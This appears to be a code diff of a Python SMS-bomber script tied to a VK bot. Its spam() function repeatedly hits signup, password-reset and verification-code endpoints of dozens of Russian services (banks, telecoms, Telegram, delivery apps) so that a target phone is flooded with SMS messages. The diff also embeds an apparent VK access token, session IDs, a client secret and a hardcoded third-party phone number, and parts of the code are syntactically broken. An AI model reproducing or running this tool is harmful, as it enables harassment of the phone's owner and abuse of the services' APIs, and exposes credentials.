@@ -18,178 +18,146 @@ try:
 
     def spam(phone, ckok, xz, zx_lol):
         o = 0
+        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36'}
+        phone = phone
+        pulse = '+' + phone
+        no7 = phone[1:] 
+        masska1 = phone = '+7+(' + phone[1:4] + ')+' + phone[4:7] + '-' + phone[7:9] + '-' + phone[9:11]
+        masska2 = phone[1:4] + '+' + phone[4:7] + '+' + phone[7:9] + '-' + phone[9:11]
+        masska3 = phone[1:4] + '+' + phone[4:7] + '-' + phone[7:9] + '-' + phone[9:11]
         while int(ckok) > o:
             o += 1
-            user = fake_useragent.UserAgent().random
-            headers = {'user_agent': user}
-            try:
-                requests.post(
-                    "https://api.delitime.ru/api/v2/signup",
-                    data={
-                        "SignupForm[username]": phone,
-                        "SignupForm[device_type]": 3,
-                    },)
+            try:requests.post("https://www.citilink.ru/registration/confirm/phone/+" + phone + "/", headers=headers, timeout=5.05)
+		    except:pass
+            try:requests.post("https://lenta.com/api/v1/registration/requestValidationCode", 
+                            json={"phone" : "+" + phone}, headers=headers, timeout=5.05)
+            except:pass
+            try:requests.post("https://taxi.yandex.ru/3.0/auth",
+                                json={"id": "fa137685fd594a9f86f529eec9543e96", "phone": phone}, headers=headers, timeout=5.05)
+            except:pass
+            try:requests.post("https://youla.ru/web-api/auth/request_code",
+                                json={"phone": phone}, headers=headers, timeout=5.05)
+            except:pass
 
-            except:
-                pass
-            try:
-                requests.post(
-                    "https://burgerking.ru/middleware/bridge/api/v3/auth/signup",
-                    json={"phone": phone, "invite": ""})
-            except:
-                pass
-            try:
-                requests.post(
-                    "https://msk.tele2.ru/api/validation/number/" + phone,
-                    json={"sender": "Tele2"},
-                )
-            except:
-                pass
-            try:
-                a = requests.post("https://www.citilink.ru/registration/confirm/phone/+" + phone + "/",
-                                  headers=headers)
-            except:
-                pass
-            try:
-                a = requests.post("https://u.icq.net/api/v32/rapi/auth/sendCode",
-                                  json={"reqId": "91101-1606335718",
-                                        "params": {"phone": phone, "language": "ru-RU", "route": "sms",
-                                                   "devId": "ic1rtwz1s1Hj1O0r", "application": "icq"}},
-                                  headers=headers)
-            except:
-                pass
-            try:
-                a = requests.post("https://youla.ru/web-api/auth/request_code",
-                                  json={"phone": phone}, headers=headers)
-            except:
-                pass
-            try:
-                a = requests.post("https://www.icq.com/smsreg/requestPhoneValidation.php", data={
-                    "msisdn": phone,
-                    "locale": "en",
-                    "countryCode": "ru",
-                    "version": "1",
-                    "k": "ic1rtwz1s1Hj1O0r",
-                    "r": "46763"
-                }, headers=headers)
-            except:
-                pass
-            try:
-                a = requests.post("https://eda.yandex.ru/api/v1/user/request_authentication_code",
-                                  json={"phone_number": phone}, headers=headers)
-            except:
-                pass
-            try:
-                a = requests.post(
-                    "https://ok.ru/dk?cmd=AnonymRecoveryStartPhoneLink&st.cmd=anonymRecoveryStartPhoneLink",
-                    data={"st.r.phone": "+" + phone}, headers=headers)
-            except:
-                pass
-            try:
-                a = requests.post("https://nn-card.ru/api/1.0/register",
-                                  json={"phone": phone, "password": 'DDdfff7873456'}, headers=headers)
-            except:
-                pass
-            try:
-                a = requests.post("https://my.modulbank.ru/api/v2/auth/phone",
-                                  json={"CellPhone": phone[1:]}, headers=headers)
-            except:
-                pass
-            try:
-                a = requests.post(
-                    "https://www.tinkoff.ru/api/common/v1/sign_up?origin=web%2Cib5%2Cplatform&sessionid=uRdqKtttiyJYz6ShCqO076kNyTraz7pa.m1-prod-api56&wuid=8604f6d4327bf4ef2fc2b3efb36c8e35",
+            try:requests.post("https://eda.yandex.ru/api/v1/user/request_authentication_code",
+                                json={"phone_number": phone}, headers=headers, timeout=5.05)
+            except:pass
 
-                    data={"phone": "+" + phone}, headers=headers)
-            except:
-                pass
-            try:
-                a = requests.post(
-                    "https://sayan.rutaxi.ru/ajax_keycode.html?qip=962358614986707810&lang=ru&source=0",
+            try:requests.post("https://my.modulbank.ru/api/v2/auth/phone",
+                                json={"CellPhone": phone[1:]}, headers=headers, timeout=5.05)
 
-                    data={"l": phone[1:]}, headers=headers)
-            except:
-                pass
-            try:
-                a = requests.post("https://my.modulbank.ru/api/v2/auth/phone",
-                                  data={"CellPhone": phone[1:]}, headers=headers)
-            except:
-                pass
-            try:
-                a = requests.post("https://ng-api.webbankir.com/user/v2/create",
-                                  json={"lastName": "уцвцу", "firstName": "цувцу", "middleName": "цуацуа",
-                                        "mobilePhone": phone, "email": "asadsd@mail.ru", "smsCode": ""},
-                                  headers=headers)
-            except:
-                pass
-            try:
-                a = requests.post("https://stavropol.sushi-market.com/sendForm/callMeBack",
-                                  json={"phone": phone[1:], "name": "Егор"}, headers=headers)
-            except:
-                pass
-            try:
-                a = requests.post("https://m.tiktok.com/node-a/send/download_link",
-                                  json={"slideVerify": 0, "language": "ru", "PhoneRegionCode": "7",
-                                        "Mobile": phone[1:],
-                                        "page": {"pageName": "home", "launchMode": "direct",
-                                                 "trafficType": ""}},
-                                  headers=headers)
-            except:
-                pass
-            try:
-                a = requests.post("https://api.sunlight.net/v3/customers/authorization/",
-                                  data={"phone": phone},
-                                  headers=headers)
-            except:
-                pass
-            try:
-                a = requests.post("https://cloud.mail.ru/api/v2/notify/applink",
-                                  json={
-                                      "phone": "+" + phone,
-                                      "api": 2,
-                                      "email": 'dgirherfib@gmaqil.com',
-                                      "x-email": "x-email",
-                                  }, headers=headers)
-            except:
-                pass
-            try:
-                a = requests.post("https://mobile-api.qiwi.com/oauth/authorize",
-                                  data={
-                                      "response_type": "urn:qiwi:oauth:response-type:confirmation-id",
-                                      "username": phone,
-                                      "client_id": "android-qw",
-                                      "client_secret": "zAm4FKq9UnSe7id",
-                                  }, headers=headers)
-            except:
-                pass
-            try:
-                a = requests.post("https://lenta.com/api/v1/authentication/requestValidationCode",
-                                  json={"phone": "+" + phone}, headers=headers)
-            except:
-                pass
-            try:
-                a = requests.post("https://passport.twitch.tv/register?trusted_request=true",
-                                  json={
-                                      "birthday": {"day": 12, "month": 10, "year": 2000},
-                                      "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp",
-                                      "include_verification_code": True,
-                                      "password": 'Danil5564554',
-                                      "phone_number": phone,
-                                      "username": 'bhtrtrrrtbhtrbhtr',
-                                  }, headers=headers)
-            except:
-                pass
-            try:
-                a = requests.post("https://my.telegram.org/auth/send_password",
-                                  data={"phone": "+" + phone}, headers=headers)
-            except:
-                pass
-            try:
-                a = requests.post(
-                    'https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
-                    params={'msisdn': phone}, headers=headers)
-            except:
-                pass
+            except:pass
+            try:requests.post("https://www.tinkoff.ru/api/common/v1/sign_up?origin=web%2Cib5%2Cplatform&sessionid=uRdqKtttiyJYz6ShCqO076kNyTraz7pa.m1-prod-api56&wuid=8604f6d4327bf4ef2fc2b3efb36c8e35",
+                                data={"phone": "+" + phone}, headers=headers, timeout=5.05)
+            except:pass
 
+            try:requests.post("https://ng-api.webbankir.com/user/v2/create",
+                                json={"lastName": "Алексей", "firstName": "Смирнов", "middleName": "Алексейй",
+                                    "mobilePhone": phone, "email": "asadsd@mail.ru", "smsCode": ""}, headers=headers, timeout=5.05)
+
+            except:pass
+
+            try:requests.post("https://my.telegram.org/auth/send_password",
+                                data={"phone": "+" + phone}, headers=headers, timeout=5.05)
+            except:pass
+
+            try:requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
+                            params={'msisdn': phone}, headers=headers, timeout=5.05)
+            except:pass
+
+            try:requests.post("https://youla.ru/web-api/auth/request_code", data={"phone": phone}, headers=headers, timeout=5.05)
+            except:pass
+
+            try:requests.post("https://apteka.magnit.ru/api/personal/auth/code/", 
+                        data={'phone': phone}, headers=headers, timeout=5.05)
+            except:pass
+
+            try:requests.post("https://loymax.ivoin.ru/publicapi/api/ResetPassword/Start", 
+                        json={notifierIdentity: phone}, headers=headers , timeout=5.05)
+            except:pass
+
+            try:requests.post("https://ok.ru/dk?cmd=AnonymRecoveryStartPhoneLink&st.cmd=anonymRecoveryStartPhoneLink",
+                        data={st.r.phone: pulse}, headers=headers, timeout=5.05)
+            except:pass
+
+            try:requests.post("https://apteka-ot-sklada.ru/api/auth/requestBySms",
+                        json={phone: phone}, headers=headers, timeout=5.05)
+            except:pass
+
+            try:requests.post("https://re-store.ru/local/components/multisite/system.auth.sms/ajax.php",
+                        json={
+                            "action": "code_sms",
+                            "PERSONAL_PHONE": masska1,
+                            "PERSONAL_EMAIL": ""
+                        }, headers=headers, timeout=5.05)
+            except:pass
+
+            try:requests.post("https://zharpizza.ru/login",
+                        json={phone: masska2}, headers=headers, timeout=5.05)
+            except:pass
+
+            try:requests.post("https://www.gloria-jeans.ru/phone-verification/send-code/registration",
+                        json={phoneNumber: pulse}, headers=headers, timeout=5.05)
+            except:pass
+
+            try:requests.options('https://i.api.kari.com/ecommerce/client/registration/verify/phone/code?phone=' + pulse, headers=headers, timeout=5.05)
+            except:requests.options('https://i.api.kari.com/ecommerce/client/registration/verify/phone/code?phone=' + pulse, headers=headers, timeout=5.05)
+
+            try:requests.post("https://bizonpizza.ru/api/auth/send-sms-verification-code",
+                        json={phoneNumber: pulse}, headers=headers, timeout=5.05)
+            except:pass
+
+            try:requests.post("https://login.mts.ru/amserver/UI/Login?service=login&srcsvc=sitemts&goto=https://moskva.mts.ru/json/auth/publicuser/afterlogin",
+                        json= {
+                            "login": masska3,
+                            "IDToken1": no7,
+                            "IDButton": "Submit",
+                            "encoded": "false",
+                            "loginURL": "?service=sitemts&goto=https%3A%2F%2Fmoskva.mts.ru%2Fjson%2Fauth%2Fpublicuser%2Fafterlogin",
+                            "csrf.sign": "fee386083ef6b2ded9d9e2abebe2445ffee6750a32f501987d864a6b6aa619a7058e7f2ea0bfd3f3c0fafa9e34c0401071e07dfd620e9e7eeb8302205abe6ae4",
+                            "csrf.ts": "1630205683640"	
+                        }, headers=headers, timeout=5.05)
+            except:pass
+
+
+            try:requests.post("https://cnt-odcv-itv02.svc.iptv.rt.ru/api/v2/portal/send_sms_code",
+                        json={
+                            "action": "register",
+                            "phone": phone
+                        }, headers=headers, timeout=5.05)
+            except:pass		
+
+
+            try:requests.post("https://www.tinkoff.ru/api/common/v1/sign_up?origin=web%2Cib5%2Cplatform&sessionid=uRdqKtttiyJYz6ShCqO076kNyTraz7pa.m1-prod-api56&wuid=8604f6d4327bf4ef2fc2b3efb36c8e35",
+                            data={"phone": pulse}, headers=headers, timeout=5.05)
+            except:pass
+
+
+            try:requests.post('https://www.etm.ru/cat/runprog.html',
+                            data={'m_phone': no7, 
+                                'mode': 'sendSms', 
+                                'syf_prog': 'clients-services', 
+                                'getSysParam': 'yes'}, headers=headers, timeout=5.05)
+
+            except:pass
+
+
+
+            try:requests.post("https://smotrim.ru/login",
+                        data={phone: phone}, headers=headers, timeout=3)
+            except:pass		
+
+
+
+            try:requests.post("https://nn-card.ru/api/1.0/restore-password",
+                        json={
+                            "password": "lolol999",
+                            "phone": "79602705559",
+                            "token": "03AGdBq24Reu7rlNKChsDo0c0XQsAZ1Xp-8_8bOjjMh768IdmDm_kMEUJSTrH8qThSZlCZJtdii0xp7P022na6RKUmYOKQkTHhaCz1DzWKYGypjJYPRWQWSy5i1EAUH1k3txkuD3ZPSKPqzxmZHzjXww1bDLkUAJhs5mdbMutBeo1nffWYkx6m-5f4HdC66MVGsHg80BgQuU2HU4jz9meCMv0Ns2oD-frfsUfLFFmNQnoYNj5qOFBibIKOsIWVMBU2GWK6Y_MJ8Nbq1wEldLX3D5LvzFGIyFCBpvgzOa9P_0SCmV2To01rxdn9Kpii5PLChTTIsX97_hZo3CK5FSsaujVIaFqh_vojnyyb5c1tjg3lJpS8xESjbhjJC4mmaBbgYeT-ZduuGr41KvInnOs2GsVGxJ2B4wKPsA"
+                        }, headers=headers, timeout=3)
+            except:pass	
+
+        
     token = "355c4b2a43eff741bedb8d953c7be392e98c08c1f341bec74482dc041cc9a9471edfd457fb1507b6b3355"
     authorize = vk_api.VkApi(token=token)
     longpoll = VkLongPoll(authorize)
